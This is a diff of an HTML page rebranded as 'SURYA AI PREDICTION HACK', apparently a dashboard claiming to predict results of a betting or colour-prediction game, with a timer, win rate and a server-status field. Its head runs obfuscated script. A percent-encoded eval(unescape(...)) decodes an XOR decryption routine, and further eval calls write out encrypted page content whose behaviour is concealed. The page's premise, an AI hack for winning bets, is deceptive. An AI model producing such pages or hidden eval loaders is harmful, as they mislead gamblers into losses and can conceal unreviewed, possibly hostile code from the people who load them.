@@ -1,216 +1,354 @@
-        <html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> AS OFFICIAL</title>
+    <title> SURYA PRIVATE HACK</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@600&family=Roboto+Slab:wght@700&family=Teko:wght@700&family=Righteous&family=Chakra+Petch:wght@700&display=swap" rel="stylesheet">
     <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
+        body {
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-    body {
-        margin: 0;
-        font-family: 'Poppins', sans-serif;
-        background: radial-gradient(circle at center, #0d0d0d, #050505);
-        color: #ffffff;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        min-height: 100vh;
-        overflow-x: hidden;
-    }
+        .wrapper {
+            background-color: #2d2d2d;
+            text-align: center;
+            padding: 15px 0;
+            width: 100%;
+            border-bottom: 2px solid #2ecc71;
+        }
 
-    .wrapper {
-        background: rgba(255, 255, 255, 0.1);
-        text-align: center;
-        padding: 15px 0;
-        width: 100%;
-        border-bottom: 2px solid #0ff;
-        backdrop-filter: blur(10px);
-        box-shadow: 0 4px 20px rgba(0, 255, 255, 0.3);
-    }
+        svg {
+            font-family: 'Orbitron', sans-serif;
+            width: 100%;
+            height: 50px;
+            margin: 0 auto;
+        }
 
-    svg {
-        font-family: 'Orbitron', sans-serif;
-        width: 100%;
-        height: 50px;
-        margin: 0 auto;
-    }
+        svg text {
+            animation: stroke 5s infinite alternate;
+            stroke-width: 2;
+            stroke: #2ecc71;
+            font-size: 30px;
+            fill: #2ecc71;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
 
-    svg text {
-        animation: neonGlow 1.5s infinite alternate;
-        stroke-width: 2;
-        stroke: #0ff;
-        font-size: 32px;
-        fill: transparent;
-        letter-spacing: 2px;
-        text-transform: uppercase;
-    }
+        @keyframes stroke {
+            0% { fill: rgba(46, 204, 113, 0); stroke: rgba(46, 204, 113, 1); stroke-dashoffset: 25%; stroke-dasharray: 0 50%; stroke-width: 2; }
+            70% { fill: rgba(46, 204, 113, 0); stroke: rgba(46, 204, 113, 1); }
+            80% { fill: rgba(46, 204, 113, 0); stroke: rgba(46, 204, 113, 1); stroke-width: 3; }
+            100% { fill: rgba(46, 204, 113, 1); stroke: rgba(46, 204, 113, 0); stroke-dashoffset: -25%; stroke-dasharray: 50% 0; stroke-width: 0; }
+        }
 
-    @keyframes neonGlow {
-        0% { stroke: #0ff; text-shadow: 0 0 5px #0ff, 0 0 10px #0ff; }
-        100% { stroke: #00f0ff; text-shadow: 0 0 10px #00f0ff, 0 0 20px #00f0ff; }
-    }
+        .version-text, .update-text {
+            font-family: 'Righteous', sans-serif;
+            font-size: 12px;
+            color: #2ecc71;
+            margin-top: 5px;
+        }
 
-    .container {
-        max-width: 450px;
-        width: 90%;
-        background: rgba(255, 255, 255, 0.1);
-        padding: 20px;
-        border-radius: 15px;
-        backdrop-filter: blur(12px);
-        box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
-        margin: 30px auto;
-        border: 2px solid rgba(0, 255, 255, 0.3);
-    }
+        .container {
+            max-width: 400px;
+            width: 90%;
+            background: #252525;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            margin: 20px auto;
+        }
 
-    .selection-box select {
-        width: 100%;
-        padding: 12px;
-        font-size: 1em;
-        border-radius: 10px;
-        border: 2px solid #0ff;
-        background: rgba(0, 0, 0, 0.5);
-        color: #0ff;
-        font-family: 'Poppins', sans-serif;
-        margin-bottom: 20px;
-        text-align: center;
-        outline: none;
-        box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
-    }
+        .selection-box select {
+            width: 100%;
+            padding: 12px;
+            font-size: 1em;
+            border-radius: 8px;
+            border: 2px solid #2ecc71;
+            background: #333333;
+            color: #ffffff;
+            font-family: 'Poppins', sans-serif;
+            margin-bottom: 20px;
+        }
 
-    .info-box {
-        background: rgba(255, 255, 255, 0.1);
-        padding: 15px;
-        border-radius: 12px;
-        box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
-        border-left: 4px solid #0ff;
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: space-between;
-    }
+        .info-box {
+            background: #2d2d2d;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            border-left: 4px solid #2ecc71;
+        }
 
-    .info-box span {
-        flex: 1 1 45%;
-        font-size: 1em;
-        color: #ffffff;
-        margin: 5px 0;
-    }
+        .info-box span {
+            flex: 1 1 45%;
+            font-size: 0.9em;
+            color: #ffffff;
+            margin: 5px 0;
+        }
 
-    .info-box .value {
-        font-family: 'Orbitron', sans-serif;
-        font-size: 1.2em;
-        color: #0ff;
-        font-weight: 700;
-    }
+        .info-box .value {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1.1em;
+            color: #2ecc71;
+            font-weight: 700;
+        }
 
-    .win-rate-bar {
-        width: 100%;
-        height: 12px;
-        background: rgba(0, 0, 0, 0.5);
-        border-radius: 6px;
-        overflow: hidden;
-        margin-top: 8px;
-    }
+        .info-box i {
+            margin-right: 8px;
+            color: #2ecc71;
+        }
 
-    .win-rate-fill {
-        height: 100%;
-        background: #0ff;
-        border-radius: 6px;
-        transition: width 0.5s ease-in-out;
-    }
+        .analysis-container {
+            background: #2d2d2d;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            margin-bottom: 20px;
+        }
 
-    .history-box {
-        background: rgba(255, 255, 255, 0.1);
-        padding: 12px;
-        border-radius: 10px;
-        box-shadow: 0 0 10px rgba(0, 255, 255, 0.2);
-        border-left: 4px solid #0ff;
-    }
+        .analysis-header {
+            font-family: 'Teko', sans-serif;
+            font-size: 1.6em;
+            color: #2ecc71;
+            text-align: center;
+            margin-bottom: 15px;
+        }
 
-    .history-box span {
-        display: block;
-        font-size: 1em;
-        color: #ffffff;
-    }
+        .analysis-box {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
 
-    .history-box .value {
-        font-family: 'Orbitron', sans-serif;
-        font-size: 1em;
-        color: #0ff;
-    }
+        .analysis-item {
+            background: #333333;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+        }
 
-    .clear-btn {
-        width: 100%;
-        padding: 12px;
-        font-size: 1em;
-        background: transparent;
-        color: #0ff;
-        border: 2px solid #0ff;
-        border-radius: 8px;
-        cursor: pointer;
-        transition: all 0.3s ease-in-out;
-        font-family: 'Poppins', sans-serif;
-        box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
-    }
+        .analysis-item span {
+            display: block;
+            font-size: 0.9em;
+            color: #ffffff;
+            margin-bottom: 5px;
+        }
 
-    .clear-btn:hover {
-        background: #0ff;
-        color: #050505;
-        box-shadow: 0 0 20px #0ff;
-    }
+        .analysis-item .value {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1.1em;
+            color: #2ecc71;
+            font-weight: 700;
+        }
 
-    .notification {
-        position: fixed;
-        top: 15px;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 90%;
-        max-width: 320px;
-        padding: 15px;
-        border-radius: 8px;
-        color: #ffffff;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        box-shadow: 0 4px 15px rgba(0, 255, 255, 0.3);
-        animation: fadeIn 0.3s ease forwards, fadeOut 0.3s ease 3s forwards;
-    }
+        .win-rate-bar {
+            width: 100%;
+            height: 10px;
+            background: #404040;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
 
-    .notification.win {
-        background: #00ff99;
-        box-shadow: 0 0 15px #00ff99;
-    }
+        .win-rate-fill {
+            height: 100%;
+            background: #2ecc71;
+            border-radius: 5px;
+            transition: width 0.5s ease-in-out;
+        }
 
-    .notification.loss {
-        background: #ff4444;
-        box-shadow: 0 0 15px #ff4444;
-    }
+        .history {
+            margin-top: 20px;
+        }
 
-    .notification-close {
-        font-size: 1.2em;
-        cursor: pointer;
-    }
+        .history-header {
+            font-family: 'Teko', sans-serif;
+            font-size: 1.6em;
+            color: #2ecc71;
+            text-align: center;
+            margin-bottom: 15px;
+        }
 
-    @keyframes fadeIn {
-        0% { opacity: 0; transform: translateX(-50%) translateY(-15px); }
-        100% { opacity: 1; transform: translateX(-50%) translateY(0); }
-    }
+        .history-box {
+            background: #2d2d2d;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
 
-    @keyframes fadeOut {
-        0% { opacity: 1; transform: translateX(-50%) translateY(0); }
-        100% { opacity: 0; transform: translateX(-50%) translateY(-15px); }
-    }
+        .history-box span {
+            display: block;
+            font-size: 0.9em;
+            color: #ffffff;
+            margin: 5px 0;
+        }
 
-    .result-animation {
-        animation: pulseGlow 0.5s ease forwards;
-    }
+        .history-box .value {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1em;
+            color: #2ecc71;
+        }
 
-    @keyframes pulseGlow {
-        0% { opacity: 0; transform: scale(0.9); box-shadow: 0 0 5px #0ff; }
-        100% { opacity: 1; transform: scale(1); box-shadow: 0 0 20px #0ff; }
-    }
-</style>
+        .status-win { color: #2ecc71; }
+        .status-loss { color: #ff4444; }
+        .status-pending { color: #ffa500; }
+
+        .clear-btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 1em;
+            background: #333333;
+            color: #2ecc71;
+            border: 2px solid #2ecc71;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Roboto Slab', sans-serif;
+        }
+
+        .clear-btn:hover {
+            background: #2ecc71;
+            color: #1a1a1a;
+        }
+
+        .notification {
+            position: fixed;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 300px;
+            padding: 12px 15px;
+            border-radius: 8px;
+            color: #ffffff;
+            z-index: 1002;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.3s ease forwards, slideOut 0.3s ease 3s forwards;
+        }
+
+        .notification.win {
+            background: #2ecc71;
+        }
+
+        .notification.loss {
+            background: #ff4444;
+        }
+
+        .notification-text {
+            font-family: 'Poppins', sans-serif;
+            font-size: 1em;
+            font-weight: 600;
+        }
+
+        .notification-close {
+            font-size: 1.1em;
+            cursor: pointer;
+            padding: 0 5px;
+        }
+
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+            100% { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        @keyframes slideOut {
+            0% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+        }
+
+        .break-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2d2d2d;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            text-align: center;
+            color: #ffffff;
+            border: 2px solid #2ecc71;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -40%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        .break-popup h3 {
+            margin: 0 0 15px;
+            font-size: 1.6em;
+            font-weight: 700;
+            font-family: 'Teko', sans-serif;
+            color: #2ecc71;
+        }
+
+        .break-popup p {
+            font-size: 1.1em;
+            margin: 0 0 15px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .typing {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            border-right: 2px solid #2ecc71;
+            animation: typing 3s steps(30, end) infinite, blink 0.5s step-end infinite;
+        }
+
+        @keyframes typing {
+            0% { width: 0; }
+            50% { width: 100%; }
+            100% { width: 0; }
+        }
+
+        @keyframes blink {
+            0% { border-color: transparent; }
+            50% { border-color: #2ecc71; }
+            100% { border-color: transparent; }
+        }
+
+        .result-animation {
+            animation: fadeInScale 0.5s ease forwards;
+        }
+
+        @keyframes fadeInScale {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+    </style>
+    
 <script type="text/javascript">
 <!-- 
 eval(unescape('%66%75%6e%63%74%69%6f%6e%20%68%63%36%30%38%65%63%62%65%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%38%32%36%33%33%37%35%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%39%38%30%36%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%33%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
@@ -224,7 +362,7 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%68%63%36%30%38%65%6
 <div class="wrapper">
     <svg>
         <text x="50%" y="50%" dy=".35em" text-anchor="middle">
-           SURYA  PREDICTOR
+            SURYA AI PREDICTION HACK 
         </text>
     </svg>
     <div class="version-text">VERSION CODE - 1.0 [ PNPIVM1 ]</div>
@@ -240,12 +378,12 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%68%63%36%30%38%65%6
     </div>
 
     <div class="info-box">
-        <span><i class="fas fa-calendar-day"></i> PERIOD</span>
-        <span id="periodNumber" class="value">LOADING...</span>
-        <span><i class="fas fa-hourglass-half"></i> TIME LEFT</span>
+        <span><i class="fas fa-calendar-day"></i> Period</span>
+        <span id="periodNumber" class="value">Loading...</span>
+        <span><i class="fas fa-hourglass-half"></i> Time Left</span>
         <span id="timer" class="value">00:00</span>
-        <span><i class="fas fa-chart-line"></i> RESULT</span>
-        <span id="currentResult" class="value">WAITING...</span>
+        <span><i class="fas fa-chart-line"></i> Result</span>
+        <span id="currentResult" class="value">Waiting...</span>
     </div>
 
     <div class="analysis-container">
@@ -254,31 +392,31 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%68%63%36%30%38%65%6
         </div>
         <div class="analysis-box">
             <div class="analysis-item">
-                <span>🤖</span>
+                <span>Most Frequent</span>
                 <span id="mostFrequent" class="value">-</span>
             </div>
             <div class="analysis-item">
-                <span>🤖</span>
+                <span>Least Frequent</span>
                 <span id="leastFrequent" class="value">-</span>
             </div>
             <div class="analysis-item">
-                <span>WIN RATE</span>
+                <span>Win Rate</span>
                 <span id="winAccuracy" class="value">0%</span>
                 <div class="win-rate-bar">
                     <div id="winRateFill" class="win-rate-fill" style="width: 0%;"></div>
                 </div>
             </div>
             <div class="analysis-item">
-                <span>WINS</span>
+                <span>Wins</span>
                 <span id="totalWins" class="value">0</span>
             </div>
             <div class="analysis-item">
-                <span>LOSSS</span>
+                <span>Losses</span>
                 <span id="totalLosses" class="value">0</span>
             </div>
             <div class="analysis-item">
-                <span>SERVER STATUS</span>
-                <span id="serverStatus" class="value">CONNECTED</span>
+                <span>Server Status</span>
+                <span id="serverStatus" class="value">Connected</span>
             </div>
         </div>
     </div>
@@ -307,4 +445,4 @@ eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6e%39%61%37%37%36%6
 <noscript><i>Javascript required</i></noscript>
 
 </body>
-</html>        
+</html>
